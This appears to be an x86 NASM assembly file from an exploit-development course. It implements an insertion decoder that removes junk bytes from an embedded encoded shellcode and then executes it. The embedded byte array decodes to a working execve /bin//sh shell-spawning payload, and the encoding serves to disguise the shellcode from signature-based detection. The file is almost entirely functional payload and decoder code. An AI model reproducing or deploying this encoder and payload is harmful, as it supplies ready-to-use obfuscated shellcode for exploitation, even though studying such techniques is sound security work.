; Filename: random-insertion-decoder-counter.nasm
; Author: Gitsnik SLAE-431
; Website: http://dracyrys.com/
;
; Purpose:
;	Make the insertion decoder a little more robust
;	by not caring what the secondary values are, only
;	the final one. This permits 254/255 characters
;	to be used in randomness.
;
;	If you use my version of the Insertion-Encoder.py
;	these numbers are reduced. Please read the notes
;	below for more details on possible values.
;
; Notes:
;
; At the moment we are simply decrementing our counter.
; This means, of course, that you need to manually
; enter the size of the shellcode.
;
; Well, not actually true, in this case we do a simple
; bit of math to come up with half the size of the
; shellcode, so make sure you have an even number of bytes
; in your insertion :)
;
; This file is noted as counter because it is an ECX counter
; check that eventually jumps us out of the shellcode.
;

global _start			

section .text
_start:

	jmp short call_shellcode

decoder:
	pop esi
	lea edi, [esi +1]
	xor eax, eax
	mov al, 1
	xor ebx, ebx
	xor ecx, ecx

	mov cl, codelen
	sar ecx, 1			; Divide by 2

decode: 
	mov bl, byte [esi + eax]
	dec ecx				; Decrement ECX
	jz short EncodedShellcode	; Jump to EncodedShellcode when ECX is 0.
					; That is, when we have looped through
					; all our shellcode completely.
					;
					; This permits us to have absolutely anything
					; we like in the random fields because the
					; decoder will never actually look at the
					; value beyond this decrement.
					;
					; We still need the junk value at the end
					; of the shellcode, but we don't care what it
					; is. This way we can change the Insertion
					; randomness to be 1,255 instead of the
					; reduced set we're currently using.

	mov bl, byte [esi + eax + 1]
	mov byte [edi], bl
	inc edi
	add al, 2
	jmp short decode	



call_shellcode:

	call decoder
	EncodedShellcode: db 0x31,0x58,0xc9,0x48,0xf7,0x65,0xe1,0x4f,0x50,0x72,0x68,0x6c,0x6e,0x77,0x2f,0x73,0x73,0x4a,0x68,0x57,0x68,0x69,0x2f,0x5f,0x2f,0x48,0x62,0x61,0x69,0x66,0x89,0x75,0xe3,0x70,0xb0,0x4d,0x0b,0x62,0xcd,0x72,0x80,0xff
	codelen	equ $-EncodedShellcode
